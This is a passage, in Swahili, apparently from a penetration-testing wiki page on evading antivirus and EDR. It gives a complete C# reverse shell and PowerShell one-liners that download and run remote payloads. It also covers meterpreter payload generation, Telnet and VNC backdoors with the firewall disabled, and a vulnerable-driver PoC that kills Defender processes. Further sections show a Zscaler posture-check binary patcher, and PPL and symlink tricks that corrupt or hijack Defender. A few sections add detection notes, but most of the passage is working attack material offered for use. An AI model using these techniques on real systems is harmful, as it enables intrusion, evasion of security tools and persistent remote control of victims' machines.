- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha pe files mbalimbali tofauti ikijumuisha: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni simple metamorphic code engine kwa ajili ya arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa ajili ya lugha zinazoungwa mkono na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha regular instructions kuwa ROP chains, ikizuia dhana yetu ya asili ya normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzipakia

## SmartScreen & MoTW

Huenda umeona screen hii unapopakua baadhi ya executables kutoka internet na kuzitekeleza.

Microsoft Defender SmartScreen ni security mechanism iliyokusudiwa kumlinda end user dhidi ya kuendesha applications zinazoweza kuwa malicious.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hufanya kazi zaidi kwa kutumia approach ya based on reputation, maana yake applications zinazopakuliwa mara chache zitawasha SmartScreen hivyo ku-alert na kuzuia end user kuendesha file (ingawa file bado linaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua files kutoka internet, pamoja na URL ilipotoka kupakuliwa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Inakagua Zone.Identifier ADS kwa file lililopakuliwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa na **trusted** signing certificate **hazitawasha SmartScreen**.

Njia yenye ufanisi sana ya kuzuia payloads zako zisipate Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kuepuka Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu madhubuti wa logging katika Windows unaoruhusu applications na system components **kurekodi events**. Hata hivyo, unaweza pia kutumiwa na security products kufuatilia na kugundua malicious activities.

Sawa na jinsi AMSI inavyozimwa (bypassed) pia inawezekana kufanya **`EtwEventWrite`** function ya user space process irudi mara moja bila kurekodi events zozote. Hii hufanywa kwa patching function hiyo kwenye memory ili irudi mara moja, na kwa njia hiyo ETW logging kwa process hiyo huzimwa.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumekuwa kujulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha post-exploitation tools zako bila kushikwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutalazimika tu kuzingatia patching AMSI kwa process nzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari hutoa uwezo wa execute C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha sacrificial process mpya**, kuinject malicious code yako ya post-exploitation kwenye process hiyo mpya, execute malicious code yako na ikimalizika, kuua process mpya. Hii ina faida na hasara zake. Faida ya fork and run method ni kwamba execution hutokea **nje ya Beacon implant process yetu**. Hii ina maana kwamba kama kitu kwenye post-exploitation action yetu kitaenda vibaya au kikikamatwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kushikwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuinject malicious code ya post-exploitation **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuipata ikiscanned na AV, lakini hasara ni kwamba kama kitu kitaenda vibaya wakati wa execution ya payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Kama unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana execute malicious code kwa kutumia languages nyingine kwa kuipa machine iliyoathiriwa access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu access kwa Interpreter Binaries na environment kwenye SMB share unaweza **execute arbitrary code katika languages hizi ndani ya memory** ya machine iliyoathiriwa.

Repo inaonyesha: Defender bado huchanganua scripts lakini kwa kutumia Go, Java, PHP etc tuna **more flexibility to bypass static signatures**. Kujaribu na random un-obfuscated reverse shell scripts katika languages hizi kumethibitika kufanikiwa.

## TokenStomping

Token stomping ni technique inayomruhusu attacker **manipulate the access token or a security prouct like an EDR or AV**, na kumruhusu kupunguza privileges zake ili process isife lakini isiwe na permissions za kuangalia malicious activities.

Ili kuzuia hili Windows inaweza **prevent external processes** kupata handles juu ya tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu deploy Chrome Remote Desktop kwenye PC ya victim kisha kuitumia kuichukua na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", kisha bonyeza faili la MSI kwa Windows ili kupakua faili la MSI.
2. Run installer kimya kimya kwenye victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye page ya Chrome Remote Desktop na bonyeza next. Wizard kisha itakuomba authorize; bonyeza Authorize button kuendelea.
4. Execute parameter iliyotolewa kwa marekebisho fulani: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion ni topic ngumu sana, wakati mwingine lazima uzingatie vyanzo vingi tofauti vya telemetry katika system moja tu, kwa hiyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika environments zilizokomaa.

Kila environment unayolenga itakuwa na strengths na weaknesses zake.

Ninakuhimiza sana uende kutazama talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata msingi wa kuelewa Advanced Evasion techniques zaidi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni talk nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo itakuwa **ondoa sehemu za binary** hadi **igundue ni sehemu gani Defender** inaiona kuwa malicious na kukugawanyia.\
Chombo kingine kinachofanya **kitu kilekile ni** [**avred**](https://github.com/dobin/avred) chenye huduma ya open web inayopatikana katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye ianze wakati mfumo umeanzishwa na iendeshe sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha telnet port** (stealth) na zima firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji bin downloads, si setup)

**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na sanidi server:

- Wezesha chaguo _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** lililoundwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha winvnc daemon `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth hupaswi kufanya vitu vichache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). angalia kama inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` kwenye directory ileile au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usitumie `winvnc -h` kupata help au utaanzisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atamaliza mchakato haraka sana.**

### Kucompila reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Kwanza C# Revershell

Icompila kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana zingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Leta Dereva Yako Yenye Udhaifu (BYOVD) – Kuua AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia utility ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kudondosha ransomware. Zana hii huleta **dereva wake mwenyewe mwenye udhaifu lakini *aliyosainiwa*** na huutumia vibaya ili kutoa operesheni za kernel zenye haki za juu ambazo hata Protected-Process-Light (PPL) AV services haziwezi kuzuia.

Mambo muhimu
1. **Dereva uliosainiwa**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary halisi ni dereva uliosainiwa kihalali `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa kuwa dereva una saini halali ya Microsoft hupakiwa hata Driver-Signature-Enforcement (DSE) ikiwa imewashwa.
2. **Usakinishaji wa service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza husajili dereva kama **kernel service** na wa pili huianzisha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na dereva**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kuua process yoyote kwa PID (imetumika kuua Defender/EDR services) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Kutoa dereva na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**:  BYOVD huruka kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua processes *zilizolindwa*, kuziua, au kuharibu kernel objects bila kujali PPL/PP, ELAM au vipengele vingine vya hardening.

Detection / Mitigation
•  Wezesha vulnerable-driver block list ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa new *kernel* services na toa alert wakati dereva inapopakiwa kutoka directory inayoweza kuandikwa na wote au haipo kwenye allow-list.
•  Angalia handles za user-mode kwenda custom device objects zikifuatwa na suspicious `DeviceIoControl` calls.

### Kuzuia Zscaler Client Connector Posture Checks kupitia On-Disk Binary Patching

**Client Connector** ya Zscaler hutumia sheria za device-posture locally na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Miundo miwili dhaifu ya design hufanya bypass kamili iwezekane:

1. Tathmini ya posture hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).
2. Internal RPC endpoints huangalia tu kwamba executable inayounganisha imesainiwa na **Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kupatch binaries nne zilizosainiwa kwenye disk** mifumo hii miwili inaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila wakati hivyo kila check huwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ process yoyote (hata isiyo na saini) inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Badilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Imezuiwa |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili asili na kuwasha upya service stack:

* **Zote** posture checks zinaonyesha **green/compliant**.
* Binaries zisizosainiwa au zilizobadilishwa zinaweza kufungua named-pipe RPC endpoints (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa inapata access isiyo na kikomo kwenye internal network iliyoainishwa na Zscaler policies.

Kesi hii inaonyesha jinsi maamuzi ya trust ya upande wa client pekee na simple signature checks yanaweza kushindwa kwa byte patches chache.

## Kunyanyasa Protected Process Light (PPL) Ili Kurekebisha AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza signer/level hierarchy ili process zilizolindwa za kiwango sawa au cha juu pekee ziweze kuharibu au kurekebisha nyingine. Kwa upande wa offensive, ukifanikiwa kuanzisha binary yenye PPL kwa njia halali na kudhibiti arguments zake, unaweza kubadilisha functionality isiyo na madhara (mfano, logging) kuwa constrained, PPL-backed write primitive dhidi ya protected directories zinazotumiwa na AV/EDR.

Ni nini hufanya process iendesheke kama PPL
- Target EXE (na DLL zozote zilizopakiwa) lazima ziwe zimesainiwa kwa PPL-capable EKU.
- Process lazima iundwe kwa CreateProcess ikitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Protection level inayooana lazima iombwe ambayo inalingana na signer wa binary (mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Levels zisizo sahihi zitashindwa wakati wa creation.

Angalia pia utangulizi mpana wa PP/PPL na LSASS protection hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua protection level na kupitisha arguments kwenda kwa target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Muundo wa matumizi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Binafsi ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujianzisha yenyewe na hukubali parameter ya kuandika faili ya logi kwenye path iliyobainishwa na caller.
- Inapoanzishwa kama PPL process, uandishi wa faili hutokea kwa msaada wa PPL.
- ClipUp haiwezi kuchanganua paths zenye spaces; tumia 8.3 short paths ili kuelekeza kwenye maeneo ambayo kwa kawaida yanalindwa.

8.3 short path helpers
- Orodhesha short names: `dir /x` katika kila parent directory.
- Toa short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Anzisha LOLBIN inayoweza kutumia PPL (ClipUp) na `CREATE_PROTECTED_PROCESS` kwa kutumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha argument ya ClipUp ya log-path ili kulazimisha kuundwa kwa faili katika protected AV directory (kwa mfano, Defender Platform). Tumia 8.3 short names ikiwa inahitajika.
3) Ikiwa binary lengwa kwa kawaida huwa wazi/imefungwa na AV wakati inaendelea kufanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa boot kabla AV haijaanza kwa kusakinisha auto-start service inayotekelezwa kwa uhakika mapema zaidi. Thibitisha boot ordering kwa Process Monitor (boot logging).
4) Baada ya reboot, uandishi unaotegemea PPL hutokea kabla AV haijafunga binaries zake, ukiharibu faili lengwa na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Huwezi kudhibiti contents ambazo ClipUp inaandika zaidi ya placement; primitive hii inafaa zaidi kwa corruption kuliko precise content injection.
- Inahitaji local admin/SYSTEM ili kusanidi/kuanzisha service na reboot window.
- Timing ni muhimu: target lazima iwe wazi; boot-time execution huepuka file locks.

Detections
- Process creation ya `ClipUp.exe` yenye unusual arguments, hasa ikiwa imeparentiwa na non-standard launchers, karibu na boot.
- New services zilizosanidiwa ku-auto-start suspicious binaries na kuanza mara kwa mara kabla ya Defender/AV. Chunguza service creation/modification kabla ya Defender startup failures.
- File integrity monitoring kwenye Defender binaries/Platform directories; unexpected file creations/modifications na processes zilizo na protected-process flags.
- ETW/EDR telemetry: tafuta processes zilizoanzishwa na `CREATE_PROTECTED_PROCESS` na anomalous PPL level usage na non-AV binaries.

Mitigations
- WDAC/Code Integrity: zuia ni signed binaries zipi zinaweza ku-run kama PPL na chini ya parent zipi; block ClipUp invocation nje ya legitimate contexts.
- Service hygiene: zuia creation/modification ya auto-start services na monitor start-order manipulation.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza startup errors zinazoonyesha binary corruption.
- Fikiria disabling ya 8.3 short-name generation kwenye volumes zinazohost security tooling ikiwa inaoana na environment yako (test thoroughly).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform inayotumia kwa kuenumerate subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye highest lexicographic version string (mfano, `4.18.25070.5-0`), kisha huanzisha Defender service processes kutoka hapo (ikisasisha service/registry paths accordingly). Uchaguzi huu huamini directory entries ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenda kwenye attacker-writable path na kufanikisha DLL sideloading au service disruption.

Preconditions
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa reboot au trigger Defender platform re-selection (service restart on boot)
- Built-in tools pekee zinahitajika (mklink)

Why it works
- Defender huzuia writes ndani ya folders zake, lakini platform selection yake huamini directory entries na huchagua lexicographically highest version bila kuthibitisha kwamba target inaresolve kwenda kwenye protected/trusted path.

Step-by-step (example)
1) Andaa writable clone ya current platform folder, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tengeneza symlink ya directory ya toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Kuchagua kichocheo (kuanzisha upya kunapendekezwa):
```cmd
shutdown /r /t 0
```
4) Hakiki MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
